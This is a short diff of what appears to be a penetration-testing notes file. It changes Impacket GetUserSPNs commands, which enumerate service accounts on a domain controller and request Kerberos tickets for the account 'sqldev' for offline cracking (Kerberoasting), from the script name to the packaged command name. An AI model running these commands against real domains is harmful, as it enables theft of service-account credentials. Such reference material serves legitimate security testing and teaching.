@@ -11,23 +11,23 @@ sudo python3 -m pip install .
 ```
 
 ```bash
-GetUserSPNs.py -h
+impacket-GetUserSPNs -h
 ```
 
 ```bash
-GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
+impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
 ```
 
 ```bash
-GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
+impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
 ```
 
 ```bash
-GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev
+impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev
 ```
 
 ```bash
-GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
+impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
 ```
 
 ```bash
